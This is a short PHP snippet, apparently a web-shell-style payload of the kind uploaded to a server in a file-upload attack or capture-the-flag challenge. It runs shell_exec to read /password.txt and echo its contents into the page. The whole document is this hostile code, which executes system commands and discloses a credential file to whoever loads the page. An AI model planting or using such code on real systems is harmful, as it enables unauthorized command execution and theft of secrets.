<?php
$output = shell_exec('cat /password.txt 2>&1');
echo "<pre>$output</pre>";
?>